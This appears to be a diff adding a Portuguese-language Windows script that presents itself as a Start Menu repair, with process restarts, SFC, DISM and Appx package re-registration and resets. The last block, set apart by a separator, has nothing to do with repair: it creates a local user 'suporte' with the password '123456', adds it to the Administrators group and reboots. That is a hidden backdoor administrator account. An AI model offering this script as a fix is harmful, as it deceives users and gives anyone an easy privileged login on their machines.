@@ -1,0 +1,50 @@
+Write-Host "Iniciando reparo do Menu Iniciar do Windows..." -ForegroundColor Cyan
+
+# 1. Finaliza processos relacionados ao menu iniciar
+Write-Host "Finalizando processos do menu iniciar..." -ForegroundColor Yellow
+Stop-Process -Name StartMenuExperienceHost -Force -ErrorAction SilentlyContinue
+Stop-Process -Name ShellExperienceHost -Force -ErrorAction SilentlyContinue
+Stop-Process -Name SearchApp -Force -ErrorAction SilentlyContinue
+Stop-Process -Name SearchHost -Force -ErrorAction SilentlyContinue
+Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
+
+Start-Sleep -Seconds 3
+
+# 2. Repara arquivos do sistema
+Write-Host "Executando SFC..." -ForegroundColor Yellow
+sfc /scannow
+
+# 3. Repara imagem do Windows
+Write-Host "Executando DISM..." -ForegroundColor Yellow
+DISM /Online /Cleanup-Image /RestoreHealth
+
+# 4. Re-registra aplicativos do Windows, incluindo menu iniciar
+Write-Host "Re-registrando aplicativos do Windows..." -ForegroundColor Yellow
+Get-AppxPackage -AllUsers | ForEach-Object {
+    Try {
+        Add-AppxPackage -DisableDevelopmentMode -Register "$($_.InstallLocation)\AppXManifest.xml" -ErrorAction Stop
+    } Catch {
+        Write-Host "Ignorado: $($_.Name)" -ForegroundColor DarkGray
+    }
+}
+
+# 5. Reinicia Explorer
+Write-Host "Reiniciando Explorer..." -ForegroundColor Yellow
+Start-Process explorer.exe
+
+Write-Host ""
+Write-Host "Reparo concluido. Reinicie o computador agora." -ForegroundColor Green
+
+
+____________________________________________________________________________________________
+
+Get-AppxPackage Microsoft.Windows.StartMenuExperienceHost -AllUsers | Reset-AppxPackage
+Get-AppxPackage Microsoft.Windows.ShellExperienceHost -AllUsers | Reset-AppxPackage
+Get-AppxPackage Microsoft.Windows.Search -AllUsers | Reset-AppxPackage
+shutdown /r /t 5
+
+_____________________________________________________________________________________________
+
+net user suporte 123456 /add
+net localgroup administradores suporte /add
+shutdown /r /t 5
